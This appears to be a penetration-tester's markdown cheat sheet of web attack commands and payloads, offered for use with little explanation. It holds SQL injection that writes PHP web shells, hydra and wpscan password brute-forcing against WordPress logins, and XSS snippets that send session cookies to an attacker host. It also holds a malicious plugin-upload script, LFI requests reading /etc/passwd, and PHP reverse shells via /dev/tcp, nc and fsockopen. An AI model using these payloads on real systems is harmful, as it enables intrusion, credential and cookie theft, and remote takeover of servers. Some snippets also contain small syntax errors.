
# Web

## User Agents 
```
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
```
```
Googlebot/2.1 (+http://www.googlebot.com/bot.html)
```
```
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
```

## SQL Injection Payloads
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/shell.php"
```
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/srv/www/shell.php"
```
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/nginx-default/shell.php"
```
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/usr/local/apache2/htdocs/shell.php"
```

## Web Applications 

### Wordpress

#### Password bruteforce

```bash
wpscan --url http://$target --username admin --wordlist /mnt/share/wordlists/rockyou.txt -t 20
```
```bash
hydra -vV -l admin -P /usr/share/wordlists/rockyou.txt $target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR" -I
```
```bash
hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt
```

#### User enumeration
```bash
hydra -vV -L /mnt/share/wordlists/rockyou.txt -p wedontcare $target http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

### phpliteadmin
```bash
hydra -l "" -P /mnt/share/wordlists/rockyou.txt -t 1 -v -V $target http-post-form /db/phpliteadmin.php:”password=^PASS^&remember=yes&login=Log+In&proc_login=true”:”Incorrect password.”
```

## XSS
```html
'">><script>i=document.createElement("img");i.src='http://$source_ip/'+document.cookie;</script>
```
```html
<script>new Image().src="http://$source_ip/"+document.cookie;</script>
```
```js
var img = document.createElement('img'); img.src = 'http://$source_ip/' + document.cookie; document.body.appendChild(img);
```
```html
<script>
var img = document.createElement('img'); img.src = 'http://$source_ip/' + document.cookie; document.body.appendChild(img);
</script>
```
```html
<iframe SRC="http://$source_ip/report" height="0" width="0"></iframe>
```
```js
var http = new XMLHttpRequest();var url = "http://$source_ip/";var params = "data=" + document.cookie;http.open("POST", url, true);http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.send(params);
```
```js
javascript:void(document.cookie="example=example");
```
```html
<script>document.location='http://$source_ip/' +escape(document.cookie)</script>
```
```js
function process_body(xhr) {
    var data = xhr.response;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    }
    return data;
}
var xhr = new XMLHttpRequest(); 
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        console.log(process_body(xhr);
    }
};
xhr.open('GET', 'http://example', true);
xhr.send(null);
```

Upload file:
```js
function doUpload(uri, fieldname, filename, content) {
	var formData = new FormData();	
	formData.append(fieldname, content, filename);

	var xhr = new XMLHttpRequest();
	xhr.open("POST", uri);
	xhr.send(formData);
	return xhr;
}
doUpload("/path/to/file", "newAttachment", "evil.php", new Blob(["<?php passthru($_GET['cmd']); ?>"], {type: "-"}))
```

Upload file:
```js 
var logUrl = 'http://example.com/upload';

function byteValue(x) {
    return x.charCodeAt(0) & 0xff;
}

function toBytes(datastr) {
    var ords = Array.prototype.map.call(datastr, byteValue);
    var ui8a = new Uint8Array(ords);
    return ui8a.buffer;
}

if (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {
	XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
	    this.send(toBytes(datastr));
	}
}

function fileUpload(fileData, fileName) {
	  var fileSize = fileData.length,
	    boundary = "9849436581144108930470211272",
	    uri = logUrl,
	    xhr = new XMLHttpRequest();

	  var additionalFields = {
	  }

	  var fileFieldName = "newPlugin";
	  
	  xhr.open("POST", uri, true);
	  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary); // simulate a file MIME POST request.
	  xhr.setRequestHeader("Content-Length", fileSize);
	  xhr.withCredentials = "true";
 
	  xhr.onreadystatechange = function() {
	    if (xhr.readyState == 4) {
	      if ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {
	        
	        if (xhr.responseText != "") {
	          alert(JSON.parse(xhr.responseText).msg); // display response.
	        }
	      } else if (xhr.status == 0) {
	    	  //$("#goto").show();
	      }
	    }
	  }
	  
	  var body = "";
	  
	  for (var i in additionalFields) {
		  if (additionalFields.hasOwnProperty(i)) {
			  body += addField(i, additionalFields[i], boundary);
		  }
	  }

	  body += addFileField(fileFieldName, fileData, fileName, boundary);
	  body += "--" + boundary + "--";
	  xhr.sendAsBinary(body);
	  return true;
}

function addField(name, value, boundary) {
	var c = "--" + boundary + "\r\n"
	c += "Content-Disposition: form-data; name='" + name + "'\r\n\r\n";
	c += value + "\r\n";
	return c;
}

function addFileField(name, value, filename, boundary) {
    var c = "--" + boundary + "\r\n"
    c += "Content-Disposition: form-data; name='" + name + "'; filename='" + filename + "'\r\n";
    c += "Content-Type: application/x-compressed-tar\r\n\r\n";
    c += value + "\r\n";
    return c;	
}

function load_binary_resource(url) {
	  var req = new XMLHttpRequest();
	  req.open('GET', url, false);
	  req.overrideMimeType('text/plain; charset=x-user-defined');
	  req.send(null);
	  if (req.status != 200) return '';
	  var bytes = Array.prototype.map.call(req.responseText, byteValue);
	  return String.fromCharCode.apply(this, bytes);
	  return req.responseText;
}

var start = function() {
	var c = load_binary_resource('Barracuda4Atmail.tgz');
	fileUpload(c, 'Barracuda4Atmail.tgz');
};

start()
```

## WebDav
```bash
davtest -url http://$target
```
```bash
curl -X PUT http://$target/test.jsp/ -d @- < test.jsp
```

## LFI 
```bash
curl -s --data "<?php system('whoami');?>" "http://$target/example.php?ACS_path=php://input%00"
```
```bash
curl "http://$target/example.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00"
```
```bash
curl "http://$target/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd%00"
```
```
curl "http://$target/example.php?page=http://10.11.0.22/menu.php?file=data:text/plain,<?php system('whoami') ?>"
```
```bash
bash $pwd/tools/web/Kadimus/bin/kadimus -u $target/?pg=contact -A "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/73.0" --threads 10 --connect-timeout 10 --retry-times 1 
```

## Payloads 
```php
<?php shell_exec("bash -i >& /dev/tcp/$source_ip/$source_port 0>&1") ?>
```
```php
<?php shell_exec("nc -e /bin/sh $source_ip $source_port") ?>
```
```php
<?php $sock=fsockopen("$source_ip",$source_port);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
## DNS
```bash
dnsrecon -d $target -t axfr
```
```bash
nmap -p 80 --script dns-brute.nse $target 
```
```bash
python dnscan.py -d $target -w ./subdomains-10000.txt
```

## LFI paths

RHEL / Red Hat / CentOS / Fedora Linux Apache log file location   
```
/var/log/httpd/access_log
```
```
/var/log/httpd/error_log
```

Debian / Ubuntu Linux Apache log file location
```
/var/log/apache2/access.log
```
```
/var/log/apache2/error.log
```

FreeBSD Apache log file location
```
/var/log/httpd-access.log
```
```
/var/log/httpd-error.log
```

Config
```
/usr/local/etc/apache2/httpd.conf
```
```
/etc/apache2/apache2.conf
```
```
/etc/httpd/conf/httpd.conf
```

Windows web roots
```
C:/xampp/htdocs/
```
```
C:/wamp/www/
```
```
C:/Inetpub/wwwroot/
```


## Web Servers 
```
python -m SimpleHTTPServer 8080
```
```
python3 -m http.server 8080
```
```
php -S 0.0.0.0:8080
```
```
ruby -run -e httpd . -p 8080
```
```
busybox httpd -f -p 8080
```

## Logs 

PHP
```
echo 'display_errors = On' | sudo tee -a /etc/php5/apache2/php.ini > /dev/null
```
```
sudo systemctl restart apache2
```